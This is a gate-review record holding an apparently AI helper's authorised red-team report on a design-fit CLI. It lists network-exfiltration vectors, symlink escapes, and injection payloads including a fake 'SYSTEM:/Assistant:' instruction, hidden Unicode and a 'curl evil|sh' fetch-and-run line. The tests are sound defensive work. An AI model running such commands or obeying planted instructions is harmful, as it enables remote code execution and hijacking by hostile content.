# Milestone M6 gate review, 2026-11-16: security attacker

The report of one helper agent, as it wrote it (hard rule 12; the owner approved the helpers with "Approved" on 2026-11-16). The helper had its own copy of commit `adcf06b` and the code, not the builder's conclusions. The text is the helper's, unedited; its claims are the helper's, and the builder's answers stand in `redteam/FINDINGS.md` (rows S8-nn).

---

# M6 security-attacker report — Refraction, commit `adcf06b`

Attacker: security red-team. Target checked out at `.../scratchpad/m6/security`; all attack files under `.../scratchpad/m6/security-scratch`. The checkout's tracked files were not changed (`git status --short` shows only the pre-existing `?? node_modules` link). A loopback leak listener ran on 127.0.0.1:18080/18081/18082 and was stopped at the end; it recorded no connection from any run.

## What I ran and covered

Code read: `plugin/fit/src/{cli,fit,collect,prescription,receipt,color}.ts`; `packages/core/src/{prescription,text,engine,brief,tokens,templates/smallBusiness}.ts`; `packages/core/src/catalog/floors.ts` path via `prescription.ts`; `.github/workflows/ci.yml`; `package.json`, `validators/package.json`, workspace pins.

Harness: a throwaway Vitest config (scratch) aliased to `packages/core/src/index.ts` to generate real Prescriptions (plain, "Fix for me", a valid trial, and a hostile loaded project through `parseProject`). Fit check driven with the real CLI and `PW_CHROMIUM=/opt/pw-browsers/chromium`.

Attacks exercised:
1. **Network reach from a hostile build**, no-scripts and `--run-scripts`: `<link rel=stylesheet/preconnect/dns-prefetch>`, `@import`, `url()`, `<img>`, `<iframe>`, `<form action>`, `a[ping]`, `meta refresh`, `fetch`, `new Image`, `WebSocket`, `RTCPeerConnection`/STUN, `sendBeacon`. Commands: `node plugin/fit/src/cli.ts [--run-scripts] build-net.html rx out`.
2. **File write / path escape**: result-folder file as a symlink to a victim file; result folder itself a symlink to a victim dir; stale receipt removal on refusal.
3. **Receipt text injection**: element text with ``` fence-breakers, a fake "SYSTEM:/Assistant:" instruction, ANSI escapes, Unicode tag chars (U+E00xx), RLO (U+202E), zero-width space; cross-site URLs with those too.
4. **Prescription text injection into `PRESCRIPTION.md`**: hostile project name / written reason / Brief answer carrying ``` runs, newlines, a fake `## 7. Floors` requirement and `curl evil|sh`, routed through `parseProject` → `writePrescription`.
5. **Floors section**: whether project data can make section 7 state something false or hide a requirement.
6. **Crash / hang**: busy-loop script under `--run-scripts`; `document.open()`+`document.write()` replacement; non-HTML build; missing Prescription file.
7. **Color-measure coverage**: off-palette colors via `text-decoration-color`, `box-shadow`, and inline-SVG `fill`.
8. **CI / dependencies**: action pinning, install scripts, version pins, `apca-w3`.

Each reported finding was reproduced at least twice.

## Findings

| ID | Severity | Finding | Evidence | Confirmed |
|---|---|---|---|---|
| S8-01 | major (owner may rate blocker) | The colors measure does not read SVG presentation paint (`fill`/`stroke`). A build that renders off-palette colors inside an inline `<svg>` earns a clean "No deviation" receipt, while the colors measure's title asserts "every color that the page draws is a color of the Prescription." SVG is the ordinary way real UIs paint brand/accent color (logos, icons, illustrations), so this is an easy break that passes. Mitigation: the receipt's "Still needs a person" list says "Shadows, gradients, and images … did not compare," and "it did not look at the page," which a careful reader may extend to inline SVG; so the false statement is an over-claim in one measure's title, not a hidden claim. | Input `build-svg.html` = the valid trial Mockup with `<svg width=80 height=80 xmlns=".../svg"><rect fill="#ff0000"/><circle fill="#00ff00"/></svg>` appended. Cmd `node plugin/fit/src/cli.ts build-svg.html rx out`. Output: `No deviation. Receipt: …` exit 0; `receipt.json` colors deviations = 0, items `[]`; all six measures 0/0. `#ff0000`/`#00ff00` appear nowhere in the receipt. | 2/2 ("No deviation" both runs) |
| S8-02 | minor | Several other visible color properties are outside the colors measure and not named in the disclaimers: `text-decoration-color` (e.g. a non-Prescription underline on a link — and the design requires underlined links), plus `column-rule`, `caret-color`, `accent-color`, `::marker`/`::selection`/`::placeholder` color. They pass the colors measure silently; `box-shadow` is similar but is covered by the "Shadows … not compared" disclaimer. The colors title again over-claims. | Input `build-decor.html` = valid Mockup + `<a style="text-decoration-color:#ff0000">` and `<div style="box-shadow:0 0 8px #00ff00">`. Colors items across two runs = only `text color #111111 …`; `#ff0000` and `#00ff00` never listed. | 2/2 |

## What I tried that held (no finding)

- **Network isolation is solid.** Every vector in attack 1 was blocked and written down; the loopback listener recorded nothing in either mode. The runtime route (`context.route('**/*')` on the whole context, `offline:true`, dead proxy, WebRTC stub, `routeWebSocket`) is the backstop, and markup/CSS references are also collected statically, so cross-site URLs hidden in `@media` blocks or un-fetched `<link>`s are still named. WebRTC/STUN (`WebRTC connection (stopped) to …`) and the WebSocket (`request to ws://…`) and `sendBeacon`/`fetch` (with `--run-scripts`) were all recorded as deviations; status 1. Evidence: `out-net/` and `out-net-s/` receipts; `leaks.log` empty of hits.
- **No file write outside the result folder.** A `receipt.json` symlink to a victim file is refused (`"The result folder holds a link named receipt.json. … it wrote nothing."`, exit 2, victim unchanged) via `refuseLinks` + `O_NOFOLLOW`. A result folder that is itself a symlink writes only the two receipt files into the operator-named directory (expected; secret file untouched). The output paths are fixed (`receipt.json`, `RECEIPT.md`); no page content influences them.
- **Receipt injection neutralized.** Deviation lines, content lines, load-failure reasons and page errors are all emitted inside a backtick fence sized by `fenceFor`/`clean`→`shown`: a ``` payload widened the fence to ```` ```` ````; newlines collapse to spaces; ANSI stripped; RLO, Unicode tag chars and ZWSP render as `⟨N invisible sign(s)⟩`. Evidence: `out-inject/` and `out-inv/` receipts (`… "A⟨1 invisible sign⟩B⟨2 invisible signs⟩C⟨1 invisible sign⟩D"`).
- **Prescription injection neutralized.** `quoted()` runs `visibleText` (removes invisible/bidi signs, normalizes line breaks) then a fence longer than any internal backtick run. A hostile name/reason/Brief with ``` runs, a fake `## 7. Floors FAKE REQUIREMENT`, and `curl evil|sh` all land inside a ```` ```text ```` block that they cannot close; `mockup.html` `<title>` is HTML-escaped. Evidence: `rx-hostile/PRESCRIPTION.md` section 1.
- **Floors cannot be falsified or hidden by a project.** `floorsPart` draws every requirement from the Catalog (`FLOORS`/`floorRules`); the only project-controlled input is `project.a11y` (a 3-value enum that gates whether the people-with-disabilities Floor is written, per D13). No free-text project field reaches section 7. The non-overridable security/host/search/performance Floors are always written verbatim.
- **No crash or unbounded hang.** A busy-loop under `--run-scripts` ended at the load timeout (~14 s wall), status 1, "4 windows not measured." `document.open()`+`document.write()` replacement produced deviations (status 1), not a pass. A non-HTML build (`"The build is not an HTML page."`) and a missing Prescription file (`"The folder has no file \"PRESCRIPTION.md\"."`) refuse with exit 2 and **no** receipt; a stale receipt left in the folder is deleted before any refusal, so an old "pass" cannot survive.
- **A hand-edited single Prescription file is caught.** `readDesignValues` requires the `[0-9a-f]{8}` fingerprint in all four files, that they agree, that the FNV-1a of `tokens.css` reproduces it, and that `tokens.json`/`tokens.css` do not disagree — otherwise exit 2. (A fully self-consistent attacker-authored Prescription is trusted as the reference, which is the intended trust model.)
- **CI / dependencies are tight.** `ci.yml` pins actions by commit SHA, `persist-credentials:false`, installs with `npm ci --ignore-scripts`, runs `npm audit --audit-level=high`, and bounds job time (45/10 min). All workspace and validator deps are exact versions (no `^`/`~`). `apca-w3` is not present (hard rule 9 honored; WCAG 2.x formula used).

## Suggested remediation for S8-01 / S8-02

Either (a) extend the collector to read SVG `fill`/`stroke` (and `text-decoration-color`) and compare them like other drawn colors, or (b) if they remain out of scope, soften the colors-measure title so it no longer says "every color that the page draws," and add inline-SVG paint and `text-decoration-color` explicitly to the "Still needs a person" list, so the receipt does not over-claim.
